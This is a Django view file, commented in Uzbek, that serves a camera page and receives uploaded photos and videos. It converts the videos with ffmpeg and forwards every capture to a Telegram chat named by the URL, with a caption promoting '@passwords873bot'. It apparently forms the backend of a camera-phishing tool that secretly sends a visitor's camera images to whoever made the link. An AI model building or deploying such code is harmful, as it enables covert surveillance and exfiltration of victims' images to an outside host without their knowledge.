import os
import uuid
import requests
import subprocess
from django.conf import settings
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.files.base import ContentFile
from django.core.files.storage import default_storage
from django.shortcuts import render

TELEGRAM_BOT_TOKEN = "TOKENNI_SHU_YERGA_QOY"

@csrf_exempt
def camera_view(request, id):

    if request.method == "GET":
        return render(request, "camera/index.html")

    # -----------------------------
    # 📸 RASM QABUL QILISH
    # -----------------------------
    if "image" in request.FILES:
        uploaded_file = request.FILES["image"]
        ext = uploaded_file.name.split('.')[-1]
        filename = f"{id}_{uuid.uuid4()}.{ext}"

        # faqat nisbiy path!!!
        relative_path = f"saved_images/{filename}"

        # saqlash
        default_storage.save(relative_path, ContentFile(uploaded_file.read()))

        # ABSOLUTE path Telegramga yuborish uchun
        full_path = os.path.join(settings.MEDIA_ROOT, relative_path)

        # rasmni telegramga yuborish
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            with open(full_path, "rb") as f:
                files = {"photo": f}
                data = {
                    "chat_id": id,
                    "caption": "Rasm 📸\n\n@passwords873bot"
                }
                requests.post(url, files=files, data=data, timeout=15)
        except Exception as e:
            print("Telegram rasm yuborishda xato:", e)

        return JsonResponse({
            "status": "success",
            "type": "image",
            "filename": filename
        })

    # -----------------------------
    # 🎥 VIDEO QABUL QILISH
    # -----------------------------
    if "video" in request.FILES:
        uploaded_file = request.FILES["video"]

        webm_filename = f"{id}_{uuid.uuid4()}.webm"
        mp4_filename = f"{id}_{uuid.uuid4()}.mp4"

        relative_webm = f"saved_videos/{webm_filename}"
        relative_mp4 = f"saved_videos/{mp4_filename}"

        # saqlash
        default_storage.save(relative_webm, ContentFile(uploaded_file.read()))

        # absolute pathlar
        webm_path = os.path.join(settings.MEDIA_ROOT, relative_webm)
        mp4_path = os.path.join(settings.MEDIA_ROOT, relative_mp4)

        # ffmpeg konvertatsiya
        try:
            subprocess.run([
                "ffmpeg", "-i", webm_path,
                "-c:v", "libx264", "-preset", "fast",
                "-c:a", "aac", "-b:a", "128k",
                "-y", mp4_path
            ], check=True)

            # Telegramga yuborish
            try:
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                with open(mp4_path, "rb") as f:
                    files = {"video": f}
                    data = {
                        "chat_id": id,
                        "caption": "Video 🎥\n\n@passwords873bot"
                    }
                    requests.post(url, files=files, data=data, timeout=60)
            except Exception as e:
                print("Telegram video yuborishda xato:", e)

        except Exception as e:
            print("FFmpeg xato:", e)
            return JsonResponse({
                "status": "error",
                "message": "FFmpeg xato"
            })

        return JsonResponse({
            "status": "success",
            "type": "video",
            "filename": mp4_filename
        })

    return JsonResponse({
        "status": "error",
        "message": "Hech qanday fayl yuborilmadi"
    })
